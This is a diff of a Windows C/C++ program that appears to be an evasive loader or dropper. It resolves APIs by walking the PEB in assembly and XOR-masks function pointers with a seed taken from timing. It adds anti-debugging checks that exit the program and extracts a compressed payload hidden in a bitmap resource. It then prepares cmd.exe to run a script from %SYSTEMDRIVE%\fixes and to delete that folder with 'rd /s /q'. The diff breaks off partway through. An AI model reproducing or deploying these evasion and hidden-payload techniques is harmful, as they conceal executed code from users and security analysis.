@@ -1,15 +1,11 @@
-#include <io.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <stdint.h>
+#include <time.h>
 #include <windows.h>
-#include <windowsx.h>
-#include <winternl.h>
-#include <direct.h>
-#include <array>
 
 #include "swap.h"
-static char valuebytes[256];
+static char *valuebytes=NULL;
 
 #define low_byte(c) ((char)((uint8_t)(c&0x0f)+97))
 #define high_byte(c) ((char)((uint8_t)((c>>4)&0x0f)+97))
@@ -83,72 +79,80 @@ void __(const char *s,unsigned short l){
 }
 #define _s(n,s,l) const char n[]=_(s,l);__(n,l);
 
+void *ppeb=NULL;
+void dbg();
 HINSTANCE huser32,hshell32,hgdi32,hkernel32,hntdll;
 
-typedef HMODULE (WINAPI *LLA)(LPCSTR);
-LLA lla;
-typedef BOOL (WINAPI *SEA)(SHELLEXECUTEINFOA*);
-SEA sea;
-typedef HBITMAP (WINAPI *CB)(int,int,UINT,UINT,const VOID*);
-CB cbmp;
-typedef HDC (WINAPI *CCDC)(HDC);
-CCDC cdc;
-typedef BOOL (WINAPI *DDC)(HDC);
-DDC ddc;
-typedef BOOL (WINAPI *DOB)(HGDIOBJ);
-DOB dob;
-typedef int (WINAPI *GOA)(HANDLE,int,LPVOID);
-GOA goa;
-typedef BOOL (WINAPI *BLT)(HDC,int,int,int,int,HDC,int,int,DWORD);
-BLT blt;
-typedef HGDIOBJ (WINAPI *SOB)(HDC,HGDIOBJ);
-SOB sob;
-typedef HPEN (WINAPI *CRP)(int,int,COLORREF);
-CRP crp;
-typedef BOOL (WINAPI *LTO)(HDC,int,int);
-LTO lto;
-typedef BOOL (WINAPI *MTE)(HDC,int,int,LPPOINT);
-MTE mte;
-typedef BOOL (WINAPI *AWR)(LPRECT,DWORD,BOOL);
-AWR awr;
-typedef HDC (WINAPI *BEP)(HWND,LPPAINTSTRUCT);
-BEP bep;
-typedef BOOL (WINAPI *EPA)(HWND,const PAINTSTRUCT *);
-EPA epa;
-typedef BOOL (WINAPI *GCR)(HWND,LPRECT);
-GCR gcr;
-typedef HDC (WINAPI *GDC)(HWND);
-GDC gdc;
-typedef int (WINAPI *GSM)(int);
-GSM gsm;
-typedef BOOL (WINAPI *IVR)(HWND,const RECT *,BOOL);
-IVR ivr;
-typedef BOOL (WINAPI *PIR)(const RECT *,POINT);
-PIR pir;
-typedef BOOL (WINAPI *RCP)();
-RCP rcp;
-typedef int (WINAPI *RDC)(HWND,HDC);
-RDC rdc;
-typedef BOOL (WINAPI *TMV)(LPTRACKMOUSEEVENT);
-TMV tmv;
-typedef BOOL (WINAPI *UWI)(HWND);
-UWI uwi;
-typedef BOOL (WINAPI *FLIB)(HMODULE);
-FLIB flib;
-typedef ULONGLONG (WINAPI *VSCM)(ULONGLONG,DWORD,BYTE);
-VSCM vscm;
-typedef BOOL (WINAPI *VVIA)(LPOSVERSIONINFOEXA,DWORD,DWORDLONG);
-VVIA vvia;
-typedef VOID (WINAPI *EXPW)(UINT);
-EXPW expw;
-typedef UINT (WINAPI *RWMA)(LPCSTR);
-RWMA rwma;
-typedef LRESULT (WINAPI *SMA)(HWND,UINT,WPARAM,LPARAM);
-SMA sma;
-typedef LPWSTR *(WINAPI *CLTAW)(LPCWSTR,int*);
-CLTAW cltaw;
-typedef NTSTATUS (WINAPI *RGV)(PRTL_OSVERSIONINFOEXW);
-RGV rgv;
+#define TIME_TYPE LARGE_INTEGER
+#define GET_TIME(s) (QueryPerformanceCounter(&(s)))
+#define GET_TIME_LAST_2BYTES(s) ((uint32_t)((s).QuadPart&0xffff))
+#define GET_TIME_LAST_BIT(s) ((uint32_t)((s).QuadPart&1))
+volatile uint32_t seed=0;
+#define _f(f) ((void *)((uint32_t)f^seed))
+
+inline double pi(uint32_t t){
+  double p=0.0;
+  double s=1.0;
+  for(uint32_t i=0; i<t; i++){
+    double k=8.0*i;
+    p+=(4.0/(k+1)-2.0/(k+4)-1.0/(k+5)-1.0/(k+6))/s;
+    s*=16.0;
+  };
+  return p;
+}
+
+uint32_t timeshift(){
+  uint32_t offsets[]={1009,3109,9109,12109,24107,48109,96053};
+  uint32_t i=0;
+  TIME_TYPE sw;
+  GET_TIME(sw);
+  i=GET_TIME_LAST_2BYTES(sw);
+  do{
+    GET_TIME(sw);
+    pi(offsets[(uint32_t)(GET_TIME_LAST_2BYTES(sw))%7]);
+  }while(i--);
+  GET_TIME(sw);
+  return GET_TIME_LAST_BIT(sw);
+}
+
+uint32_t timebits(){
+  uint32_t l=0;
+  for(uint8_t i=0; i<32; i++){
+    l<<=1;
+    l|=timeshift();
+  };
+  return l;
+}
+
+typedef volatile HMODULE (WINAPI *LLA)(LPCSTR); LLA lla;
+typedef volatile BOOL (WINAPI *SEA)(SHELLEXECUTEINFOA*); SEA sea;
+typedef volatile HBITMAP (WINAPI *CBMP)(int,int,UINT,UINT,const VOID*); CBMP cbmp;
+typedef volatile HDC (WINAPI *CCDC)(HDC); CCDC cdc;
+typedef volatile BOOL (WINAPI *DDC)(HDC); DDC ddc;
+typedef volatile BOOL (WINAPI *DOB)(HGDIOBJ); DOB dob;
+typedef volatile int (WINAPI *GOA)(HANDLE,int,LPVOID); GOA goa;
+typedef volatile BOOL (WINAPI *BLT)(HDC,int,int,int,int,HDC,int,int,DWORD); BLT blt;
+typedef volatile HGDIOBJ (WINAPI *SOB)(HDC,HGDIOBJ); SOB sob;
+typedef volatile HPEN (WINAPI *CRP)(int,int,COLORREF); CRP crp;
+typedef volatile BOOL (WINAPI *LTO)(HDC,int,int); LTO lto;
+typedef volatile BOOL (WINAPI *MTE)(HDC,int,int,LPPOINT); MTE mte;
+typedef volatile BOOL (WINAPI *AWR)(LPRECT,DWORD,BOOL); AWR awr;
+typedef volatile HDC (WINAPI *BEP)(HWND,LPPAINTSTRUCT); BEP bep;
+typedef volatile BOOL (WINAPI *EPA)(HWND,const PAINTSTRUCT *); EPA epa;
+typedef volatile BOOL (WINAPI *GCR)(HWND,LPRECT); GCR gcr;
+typedef volatile HDC (WINAPI *GDC)(HWND); GDC gdc;
+typedef volatile int (WINAPI *GSM)(int); GSM gsm;
+typedef volatile BOOL (WINAPI *IVR)(HWND,const RECT *,BOOL); IVR ivr;
+typedef volatile BOOL (WINAPI *PIR)(const RECT *,POINT); PIR pir;
+typedef volatile BOOL (WINAPI *RCP)(); RCP rcp;
+typedef volatile int (WINAPI *RDC)(HWND,HDC); RDC rdc;
+typedef volatile BOOL (WINAPI *TMV)(LPTRACKMOUSEEVENT); TMV tmv;
+typedef volatile BOOL (WINAPI *UWI)(HWND); UWI uwi;
+typedef volatile BOOL (WINAPI *FLIB)(HMODULE); FLIB flib;
+typedef volatile UINT (WINAPI *RWMA)(LPCSTR); RWMA rwma;
+typedef volatile LRESULT (WINAPI *SMA)(HWND,UINT,WPARAM,LPARAM); SMA sma;
+typedef LPWSTR *(WINAPI *CLTAW)(LPCWSTR,int*); CLTAW cltaw;
+typedef volatile NTSTATUS (WINAPI *RGV)(PRTL_OSVERSIONINFOEXW); RGV rgv;
 
 inline uint16_t strlen_i(const char *src){
   uint16_t i=0;
@@ -165,46 +169,29 @@ uint32_t __readfsdword(const uint32_t Offset){
     return value;
 };
 */
-inline void dbg(){
-  PPEB pPeb=(PPEB)__readfsdword(0x30);
-  DWORD pNtGlobalFlag=*(PDWORD)((PBYTE)pPeb+0x68);
-
-  PUINT32 pProcessHeap=(PUINT32)((PBYTE)pPeb+0x18);
-  PUINT32 pFlags=(PUINT32)(*pProcessHeap+0x40);
-  PUINT32 pForceFlags=(PUINT32)(*pProcessHeap+0x44);
-
-  if((pNtGlobalFlag&0x70)||(*pFlags&~HEAP_GROWABLE)||*pForceFlags) expw(1);
-  return;
-};
-
-
-void get_kernel32_handle(){
+void get_ppeb(){
   __asm__ volatile(
     "xor (%0),      %0\n\t"
     "mov %%fs:0x30, %0\n\t"
-    "mov 0x0C(%0),  %0\n\t"
-    "mov 0x14(%0),  %0\n\t"
-    "mov (%0),      %0\n\t"
-    "mov (%0),      %0\n\t"
-    "mov 0x10(%0),  %0\n\t"
-    : "=r"(hkernel32));
+    : "=r"(ppeb));
+};
+
 /*
   PPEB pPeb=(PPEB)__readfsdword(0x30);
   PLDR_DATA_TABLE_ENTRY ldrDataTableEntry=CONTAINING_RECORD(pPeb->Ldr->InMemoryOrderModuleList.Flink->Flink->Flink,
                                                             LDR_DATA_TABLE_ENTRY,InMemoryOrderLinks);
   hkernel32=(HMODULE)ldrDataTableEntry->DllBase;
 */
-};
-
-void get_ntdll_handle(){
+void get_handles(){
   __asm__ volatile(
-    "xor (%0),      %0\n\t"
-    "mov %%fs:0x30, %0\n\t"
+    "mov %2,        %0\n\t"
     "mov 0x0C(%0),  %0\n\t"
     "mov 0x14(%0),  %0\n\t"
     "mov (%0),      %0\n\t"
+    "mov 0x10(%0),  %1\n\t"
+    "mov (%0),      %0\n\t"
     "mov 0x10(%0),  %0\n\t"
-    : "=r"(hntdll));
+    : "=r"(hkernel32), "=r" (hntdll) : "r" (ppeb));
 };
 
 void *gpa(HMODULE m,const char *f){
@@ -238,15 +225,17 @@ void *gpa(HMODULE m,const char *f){
   return f_ptr;
 };
 
-template <typename T> void get_fn_ptr(T* &p,HINSTANCE l,const char *f){
+void *get_fn_ptr(HINSTANCE l,const char *f){
+  void* p=NULL;
   if(l){
-    p=(T*)gpa(l,f);
-    if(!p) expw(1);
+    p=gpa(l,f);
+    p=_f(p);
+    if(!p) ExitProcess(1);
     char *c=(char *)f;
     while(*c) *c++=0;
-    return;
+    return p;
   };
-  expw(1);
+  ExitProcess(1);
 };
 
 HBITMAP hBitmap,hOldBitmap;
@@ -261,22 +250,18 @@ BOOL mousetrack=FALSE,mark_yes=FALSE,mark_no=FALSE;
 TRACKMOUSEEVENT tme;
 int dlg_ret=0;
 bool inv=false;
-uint8_t read_shift=0;
-uint8_t read_mask=0;
-uint8_t *res;
-uint8_t *image;
+uint8_t *image=NULL;
 
 LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
-  dbg();
   switch(msg){
     case WM_CREATE:
-      hBitmap=cbmp(506,191,1,32,image);
-      goa(hBitmap,sizeof(BITMAP),&bm);
-      hdc=gdc(hWnd);
-      hdcMem=cdc(hdc);
-      hOldBitmap=(HBITMAP)sob(hdcMem,hBitmap);
-      hpen=crp(PS_SOLID,8,RGB(39,39,39));
-      rdc(hWnd,hdc);
+      hBitmap=((CBMP)_f(cbmp))(506,191,1,32,image);
+      ((GOA)_f(goa))(hBitmap,sizeof(BITMAP),&bm);
+      hdc=((GDC)_f(gdc))(hWnd);
+      hdcMem=((CCDC)_f(cdc))(hdc);
+      hOldBitmap=(HBITMAP)((SOB)_f(sob))(hdcMem,hBitmap);
+      hpen=((CRP)_f(crp))(PS_SOLID,8,RGB(39,39,39));
+      ((RDC)_f(rdc))(hWnd,hdc);
       return 0;
     case WM_KEYDOWN:
       if(wParam==VK_ESCAPE||wParam=='N'||wParam=='n'){
@@ -292,22 +277,22 @@ LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
       };
       break;
     case WM_LBUTTONDOWN:
-      rcp();
-      sma(hWnd,0xA1,2,0);
+      ((RCP)_f(rcp))();
+      ((SMA)_f(sma))(hWnd,0xA1,2,0);
       mpos.x=LOWORD(lParam);
       mpos.y=HIWORD(lParam);
-      if(pir(&rc_yes,mpos)){
+      if(((PIR)_f(pir))(&rc_yes,mpos)){
         dlg_ret=1;
         DestroyWindow(hWnd);
         return 0;
       };
-      if(pir(&rc_no,mpos)){
+      if(((PIR)_f(pir))(&rc_no,mpos)){
         DestroyWindow(hWnd);
         return 0;
       };
       break;
     case WM_MOUSEMOVE:
-      if(!mousetrack) mousetrack=tmv(&tme);
+      if(!mousetrack) mousetrack=((TMV)_f(tmv))(&tme);
       break;
     case WM_MOUSELEAVE:
       mousetrack=FALSE;
@@ -315,8 +300,8 @@ LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
       mark_yes=FALSE;
       mark_no=FALSE;
       if(inv){
-        ivr(hWnd,NULL,FALSE);
-        uwi(hWnd);
+        ((IVR)_f(ivr))(hWnd,NULL,FALSE);
+        ((UWI)_f(uwi))(hWnd);
         inv=false;
       };
       break;
@@ -325,7 +310,7 @@ LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
       mpos.x=LOWORD(lParam);
       mpos.y=HIWORD(lParam);
       inv=false;
-      if(pir(&rc_yes,mpos)){
+      if(((PIR)_f(pir))(&rc_yes,mpos)){
         if(!mark_yes){
           mark_yes=TRUE;
           inv=true;
@@ -336,7 +321,7 @@ LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
         };
       }
       else{
-        if(pir(&rc_no,mpos)){
+        if(((PIR)_f(pir))(&rc_no,mpos)){
           if(!mark_no){
             mark_no=TRUE;
             inv=true;
@@ -353,52 +338,51 @@ LRESULT CALLBACK dlg_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
         };
       };
       if(inv){
-        ivr(hWnd,NULL,FALSE);
-        uwi(hWnd);
+        ((IVR)_f(ivr))(hWnd,NULL,FALSE);
+        ((UWI)_f(uwi))(hWnd);
       };
       break;
     case WM_PAINT:
-      hdc=bep(hWnd,&ps);
-      gcr(hWnd,&rect);
-      blt(hdc,0,0,rect.right,rect.bottom,hdcMem,0,0,SRCCOPY);
+      hdc=((BEP)_f(bep))(hWnd,&ps);
+      ((GCR)_f(gcr))(hWnd,&rect);
+      ((BLT)_f(blt))(hdc,0,0,rect.right,rect.bottom,hdcMem,0,0,SRCCOPY);
       if(mark_yes){
-        sob(hdc,hpen);
-        mte(hdc,33,118,NULL);
-        lto(hdc,53,138);
-        lto(hdc,33,158);
-        mte(hdc,220,118,NULL);
-        lto(hdc,200,138);
-        lto(hdc,220,158);
+        ((SOB)_f(sob))(hdc,hpen);
+        ((MTE)_f(mte))(hdc,33,118,NULL);
+        ((LTO)_f(lto))(hdc,53,138);
+        ((LTO)_f(lto))(hdc,33,158);
+        ((MTE)_f(mte))(hdc,220,118,NULL);
+        ((LTO)_f(lto))(hdc,200,138);
+        ((LTO)_f(lto))(hdc,220,158);
       };
       if(mark_no){
-        sob(hdc,hpen);
-        mte(hdc,286,118,NULL);
-        lto(hdc,306,138);
-        lto(hdc,286,158);
-        mte(hdc,473,118,NULL);
-        lto(hdc,453,138);
-        lto(hdc,473,158);
+        ((SOB)_f(sob))(hdc,hpen);
+        ((MTE)_f(mte))(hdc,286,118,NULL);
+        ((LTO)_f(lto))(hdc,306,138);
+        ((LTO)_f(lto))(hdc,286,158);
+        ((MTE)_f(mte))(hdc,473,118,NULL);
+        ((LTO)_f(lto))(hdc,453,138);
+        ((LTO)_f(lto))(hdc,473,158);
       };
-      epa(hWnd,&ps);
+      ((EPA)_f(epa))(hWnd,&ps);
       break;
     case WM_DESTROY:
       PostQuitMessage(0);
-      ddc(hdcMem);
-      dob(hBitmap);
-      dob(hOldBitmap);
+      ((DDC)_f(ddc))(hdcMem);
+      ((DOB)_f(dob))(hBitmap);
+      ((DOB)_f(dob))(hOldBitmap);
       break;
   }
   return DefWindowProcA(hWnd,msg,wParam,lParam);
 }
 
 int dlg_window(HINSTANCE hInstance){
-  dbg();
   hI=hInstance;
   WNDCLASS wc;
   wc.style=0;
   wc.lpfnWndProc=dlg_wndproc;
   wc.hInstance=hInstance;
-  wc.hIcon=LoadIconA(NULL,IDI_APPLICATION);
+  wc.hIcon=NULL;
   wc.hCursor=LoadCursorA(NULL,IDC_ARROW);
   wc.hbrBackground=(HBRUSH)(COLOR_WINDOW+1);
   _s(idc,"imgdlgclass",11);
@@ -410,11 +394,11 @@ int dlg_window(HINSTANCE hInstance){
   rc={0,0,506,191};
   rc_yes={19,104,234,175};
   rc_no={272,104,487,175};
-  awr(&rc,WS_CAPTION|WS_SYSMENU, FALSE);
+  ((AWR)_f(awr))(&rc,WS_CAPTION|WS_SYSMENU, FALSE);
   int nWidth=rc.right-rc.left;
   int nHeight=rc.bottom-rc.top;
-  int nX=(gsm(SM_CXSCREEN)-nWidth)/2;
-  int nY=(gsm(SM_CYSCREEN)-nHeight)/2;
+  int nX=(((GSM)_f(gsm))(SM_CXSCREEN)-nWidth)/2;
+  int nY=(((GSM)_f(gsm))(SM_CYSCREEN)-nHeight)/2;
   if(nX<0) nX=0;
   if(nY<0) nY=0;
   tme.cbSize=sizeof(tme);
@@ -427,7 +411,7 @@ int dlg_window(HINSTANCE hInstance){
   };
   tme.hwndTrack=hWnd;
   ShowWindow(hWnd,SW_SHOW);
-  uwi(hWnd);
+  ((UWI)_f(uwi))(hWnd);
   MSG msg;
   while(GetMessageA(&msg,NULL,0,0)){
     DispatchMessageA(&msg);
@@ -437,13 +421,12 @@ int dlg_window(HINSTANCE hInstance){
   return 0;
 }
 
-UINT null_msg;;
+UINT null_msg;
 
 LRESULT CALLBACK null_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
-  dbg();
   switch(msg){
     case WM_CREATE:
-      sma(hWnd,null_msg,0,0);
+      ((SMA)_f(sma))(hWnd,null_msg,0,0);
       return 0;
     case WM_CLOSE:
     case WM_DESTROY:
@@ -461,7 +444,6 @@ LRESULT CALLBACK null_wndproc(HWND hWnd,UINT msg,WPARAM wParam,LPARAM lParam){
 };
 
 void null_window(HINSTANCE hInstance){
-  dbg();
   MSG msg;
   WNDCLASS wc;
   HWND hwnd;
@@ -473,7 +455,7 @@ void null_window(HINSTANCE hInstance){
   wc.lpszMenuName=NULL;
   _s(clsn,"main",4);
   wc.lpszClassName=clsn;
-  null_msg=rwma(wc.lpszClassName);
+  null_msg=((RWMA)_f(rwma))(wc.lpszClassName);
   if(!RegisterClassA(&wc)) return;
   hwnd=CreateWindow(wc.lpszClassName,NULL,0,0,0,0,0,0,0,hInstance,0);
   if(!hwnd){
@@ -487,14 +469,45 @@ void null_window(HINSTANCE hInstance){
   return;
 };
 
+uint8_t read_shift=0;
+uint8_t read_mask=0;
+uint8_t *res;
+
+uint8_t bytes2byte_raw(){
+  uint8_t b=0;
+  b|=(*res&0x03); b<<=2; res++; read_shift++;
+  if(read_shift==3){ res++; read_shift=0; };
+  b|=(*res&0x03); b<<=2; res++; read_shift++;
+  if(read_shift==3){ res++; read_shift=0; };
+  b|=(*res&0x03); b<<=2; res++; read_shift++;
+  if(read_shift==3){ res++; read_shift=0; };
+  b|=(*res&0x03); res++; read_shift++;
+  if(read_shift==3){ res++; read_shift=0; };
+  return b;
+};
+
+uint8_t bytes2byte(){
+  uint8_t b=bytes2byte_raw()^read_mask;
+  read_mask=b;
+  return b;
+};
+
+void bytes2uint(uint32_t &b){
+  b=0;
+  b|=bytes2byte(); b<<=8;
+  b|=bytes2byte(); b<<=8;
+  b|=bytes2byte(); b<<=8;
+  b|=bytes2byte();
+};
+
 #define LZ_BUF_SIZE 259
 #define LZ_CAPACITY 24
 #define LZ_MIN_MATCH 3
 
 uint8_t flags;
-uint8_t cbuffer[LZ_CAPACITY+1];
-uint8_t vocbuf[0x10000];
-uint32_t frequency[257];
+uint8_t *cbuffer=NULL;
+uint8_t *vocbuf=NULL;
+uint32_t *frequency=NULL;
 uint16_t buf_size;
 uint16_t vocroot;
 uint16_t offset;
@@ -511,13 +524,12 @@ uint8_t rle_flag;
 
 uint32_t dptr;
 uint32_t dsize;
-uint8_t *pdata;
 
 uint8_t dgetc(){
   dbg();
   uint8_t s=0;
   if(dptr<dsize){
-    s=pdata[dptr];
+    s=bytes2byte();
     dptr++;
   };
   return s;
@@ -647,8 +659,7 @@ uint8_t read_packed_value(void *p,uint16_t s){
   return 0;
 }
 
-void init_unpack(const uint8_t *data_ptr,const uint32_t data_size_in){
-  pdata=(uint8_t *)data_ptr;
+void init_unpack(const uint32_t data_size_in){
   dsize=data_size_in;
   dptr=buf_size=flags=vocroot=low=hlp=lenght=rle_flag=0;
   offset=range=0xffffffff;
@@ -693,89 +704,67 @@ void unarc(char *out){
 }
 
 bool iswin10(){
-  OSVERSIONINFOEXW osInfo;
-  osInfo.dwOSVersionInfoSize=sizeof(osInfo);
-  rgv(&osInfo);
-  return (uint32_t)osInfo.dwMajorVersion>=10?true:false;
+  if(rgv){
+    OSVERSIONINFOEXW osInfo;
+    osInfo.dwOSVersionInfoSize=sizeof(osInfo);
+    rgv(&osInfo);
+    return (uint32_t)osInfo.dwMajorVersion>=10?true:false;
+  };
+  return false;
 };
-
-namespace obfs {
-	template <typename Indexes> class MetaString;
-	template <size_t... I> class MetaString<std::index_sequence<I...>> {
-    public:
-      constexpr MetaString(char const *str)
-        : encrypted_buffer{ encrypt(str[I])... } {};
-    public:
-      inline const char* decrypt(void){
-        for (size_t i=0;i<sizeof...(I);i++){
-          buffer[i]=decrypt(encrypted_buffer[i]);
-        };
-        buffer[sizeof...(I)]=0;
-        return buffer;
-      }
-    private:
-      constexpr int  encrypt(char c) const { return (c+0xa)^F_0; } ;
-      constexpr char decrypt(int c) const {  return (c^F_0)-0xa; } ;
-    private:
-      char buffer[sizeof...(I) + 1] {};
-      int  encrypted_buffer[sizeof...(I)] {};
-	};
-};
-
-#define o(str) (obfs::MetaString<std::make_index_sequence<sizeof(str)>>(str).decrypt())
 
 #define data_res 0x10
 #define image_size 386584
 
-inline uint8_t *load_res(uint32_t id){
+uint8_t *load_res(uint32_t id){
   HRSRC res=FindResourceA(NULL,MAKEINTRESOURCE(id),RT_RCDATA);
   if(res){
     HGLOBAL res_handle=LoadResource(NULL,res);
-    if(res_handle){
-      return (uint8_t*)LockResource(res_handle);
-    };
-    return NULL;
+    if(res_handle) return (uint8_t*)LockResource(res_handle);
   };
   return NULL;
 };
 
-inline uint8_t bytes2byte_raw(){
-  uint8_t b=0;
-  b|=(*res&0x03); b<<=2; res++; read_shift++;
-  if(read_shift==3){ res++; read_shift=0; };
-  b|=(*res&0x03); b<<=2; res++; read_shift++;
-  if(read_shift==3){ res++; read_shift=0; };
-  b|=(*res&0x03); b<<=2; res++; read_shift++;
-  if(read_shift==3){ res++; read_shift=0; };
-  b|=(*res&0x03); res++; read_shift++;
-  if(read_shift==3){ res++; read_shift=0; };
-  return b;
+void free_mem(){
+  if(cbuffer) LocalFree(cbuffer);
+  if(frequency) LocalFree(frequency);
+  if(vocbuf) LocalFree(vocbuf);
+  if(valuebytes) LocalFree(valuebytes);
+  if(image) LocalFree(image);
 };
 
-inline uint8_t bytes2byte(){
-  uint8_t b=bytes2byte_raw()^read_mask;
-  read_mask=b;
-  return b;
-};
-
-inline void bytes2uint(uint32_t &b){
-  b=0;
-  b|=bytes2byte(); b<<=8;
-  b|=bytes2byte(); b<<=8;
-  b|=bytes2byte(); b<<=8;
-  b|=bytes2byte();
+void dbg(){
+  uint32_t pNtGlobalFlag,pFlags=0,pForceFlags=0;
+  __asm__ volatile(
+    "mov %3,        %0\n\t"
+    "mov 0x68(%0),  %2\n\t"
+    "mov 0x18(%0),  %0\n\t"
+    "mov 0x40(%0),  %1\n\t"
+    "mov 0x44(%0),  %0\n\t"
+    : "=r"(pForceFlags), "=r"(pFlags), "=r"(pNtGlobalFlag) : "r" (ppeb));
+  if((pNtGlobalFlag&0x70)||(pFlags&~HEAP_GROWABLE)||pForceFlags){
+    free_mem();
+    ExitProcess(1);
+  };
+  return;
 };
 
 void init(){
-  get_ntdll_handle();
-  get_kernel32_handle();
-  expw=(EXPW)gpa(hkernel32,o("ExitProcess"));
-  if(!expw) return;
+  get_ppeb();
+  get_handles();
   res=(uint8_t *)(load_res(data_res)+54);
-  if(res==NULL) expw(1);
+  if(res==NULL) ExitProcess(1);
   read_mask=bytes2byte_raw();
   uint32_t c=0;
   bytes2uint(c);
+  valuebytes=(char *)LocalAlloc(LMEM_ZEROINIT,256);
+  if(!valuebytes){ free_mem(); ExitProcess(1); };
+  cbuffer=(uint8_t *)LocalAlloc(LMEM_ZEROINIT,LZ_CAPACITY+1);
+  if(!cbuffer){ free_mem(); ExitProcess(1); };
+  frequency=(uint32_t *)LocalAlloc(LMEM_ZEROINIT,257*sizeof(uint32_t));
+  if(!frequency){ free_mem(); ExitProcess(1); };
+  vocbuf=(uint8_t *)LocalAlloc(LMEM_ZEROINIT,0x10000);
+  if(!vocbuf){ free_mem(); ExitProcess(1); };
   for(uint16_t i=0;i<c;i++) valuebytes[i]=bytes2byte();
   _s(dll_u,"User32",6);
   _s(dll_s,"Shell32",7);
@@ -809,39 +798,40 @@ void init(){
   _s(f0027,"SendMessageA",12);
   _s(f0028,"CommandLineToArgvW",18);
   _s(f0029,"RtlGetVersion",13);
-  get_fn_ptr(flib,hkernel32,f0007);
-  get_fn_ptr(lla,hkernel32,f0025);
-  hgdi32=lla(dll_g);
-  huser32=lla(dll_u);
-  hshell32=lla(dll_s);
+  seed=timebits();
+  flib=(FLIB)get_fn_ptr(hkernel32,f0007);
+  lla=(LLA)get_fn_ptr(hkernel32,f0025);
+  hgdi32=((LLA)_f(lla))(dll_g);
+  huser32=((LLA)_f(lla))(dll_u);
+  hshell32=((LLA)_f(lla))(dll_s);
   rgv=(RGV)gpa(hntdll,f0029);
-  if (!iswin10()) expw(0);
-  get_fn_ptr(awr,huser32,f0013);
-  get_fn_ptr(bep,huser32,f0014);
-  get_fn_ptr(epa,huser32,f0015);
-  get_fn_ptr(gcr,huser32,f0016);
-  get_fn_ptr(gdc,huser32,f0017);
-  get_fn_ptr(gsm,huser32,f0018);
-  get_fn_ptr(ivr,huser32,f0019);
-  get_fn_ptr(pir,huser32,f0020);
-  get_fn_ptr(rcp,huser32,f0021);
-  get_fn_ptr(rdc,huser32,f0022);
-  get_fn_ptr(tmv,huser32,f0023);
-  get_fn_ptr(uwi,huser32,f0024);
-  get_fn_ptr(rwma,huser32,f0026);
-  get_fn_ptr(sma,huser32,f0027);
-  get_fn_ptr(cbmp,hgdi32,f0001);
-  get_fn_ptr(cdc,hgdi32,f0002);
-  get_fn_ptr(ddc,hgdi32,f0003);
-  get_fn_ptr(dob,hgdi32,f0004);
-  get_fn_ptr(goa,hgdi32,f0005);
-  get_fn_ptr(blt,hgdi32,f0008);
-  get_fn_ptr(sob,hgdi32,f0009);
-  get_fn_ptr(crp,hgdi32,f0010);
-  get_fn_ptr(lto,hgdi32,f0011);
-  get_fn_ptr(mte,hgdi32,f0012);
-  get_fn_ptr(sea,hshell32,f0006);
-  get_fn_ptr(cltaw,hshell32,f0028);
+  if (!iswin10()) ExitProcess(0);
+  awr=(AWR)get_fn_ptr(huser32,f0013);
+  bep=(BEP)get_fn_ptr(huser32,f0014);
+  epa=(EPA)get_fn_ptr(huser32,f0015);
+  gcr=(GCR)get_fn_ptr(huser32,f0016);
+  gdc=(GDC)get_fn_ptr(huser32,f0017);
+  gsm=(GSM)get_fn_ptr(huser32,f0018);
+  ivr=(IVR)get_fn_ptr(huser32,f0019);
+  pir=(PIR)get_fn_ptr(huser32,f0020);
+  rcp=(RCP)get_fn_ptr(huser32,f0021);
+  rdc=(RDC)get_fn_ptr(huser32,f0022);
+  tmv=(TMV)get_fn_ptr(huser32,f0023);
+  uwi=(UWI)get_fn_ptr(huser32,f0024);
+  rwma=(RWMA)get_fn_ptr(huser32,f0026);
+  sma=(SMA)get_fn_ptr(huser32,f0027);
+  cbmp=(CBMP)get_fn_ptr(hgdi32,f0001);
+  cdc=(CCDC)get_fn_ptr(hgdi32,f0002);
+  ddc=(DDC)get_fn_ptr(hgdi32,f0003);
+  dob=(DOB)get_fn_ptr(hgdi32,f0004);
+  goa=(GOA)get_fn_ptr(hgdi32,f0005);
+  blt=(BLT)get_fn_ptr(hgdi32,f0008);
+  sob=(SOB)get_fn_ptr(hgdi32,f0009);
+  crp=(CRP)get_fn_ptr(hgdi32,f0010);
+  lto=(LTO)get_fn_ptr(hgdi32,f0011);
+  mte=(MTE)get_fn_ptr(hgdi32,f0012);
+  sea=(SEA)get_fn_ptr(hshell32,f0006);
+  cltaw=(CLTAW)get_fn_ptr(hshell32,f0028);
 };
 
 char *wchartocodepage(const wchar_t *src,UINT cp){
@@ -863,24 +853,18 @@ char *wchartocodepage(const wchar_t *src,UINT cp){
 
 extern "C" void __stdcall start(){
   init();
-  if(!expw) return;
   uint32_t res_size=0;
   image=(uint8_t*)LocalAlloc(LMEM_ZEROINIT,image_size);
   if(image){
     bytes2uint(res_size);
-    uint8_t *packed=(uint8_t *)LocalAlloc(LMEM_ZEROINIT,res_size);
-    if(packed){
-      for(uint32_t i=0;i<res_size;i++) packed[i]=bytes2byte();
-      init_unpack(packed,res_size);
-      for(uint32_t i=0;i<image_size;i++){
-        if(unpack_file()) break;
-        image[i]=(uint8_t)symbol;
-        if(dptr==dsize) break;
-      };
-      LocalFree(packed);
-    } else expw(1);
+    init_unpack(res_size);
+    for(uint32_t i=0;i<image_size;i++){
+      if(unpack_file()) break;
+      image[i]=(uint8_t)symbol;
+      if(dptr==dsize) break;
+    };
     int c=0;
-    LPWSTR *argv=cltaw(GetCommandLineW(),&c);
+    LPWSTR *argv=((CLTAW)_f(cltaw))(GetCommandLineW(),&c);
     if(argv){
       if(c>1){
         char *cmd=wchartocodepage(argv[1],CP_OEMCP);
@@ -906,15 +890,13 @@ extern "C" void __stdcall start(){
       _s(sea_c,"cmd.exe",7);
       _s(sea_o,"/c %SYSTEMDRIVE%\\fixes\\tsk.cmd",30);
       _s(sea_r,"/c \"rd /s /q %SYSTEMDRIVE%\\fixes\"",33);
-      char path[257];
-      GetEnvironmentVariableA(drv_e,path,257);
-      path[strlen_i(path)+1]=0;
-      path[strlen_i(path)]='/';
-      bytes2uint(res_size);
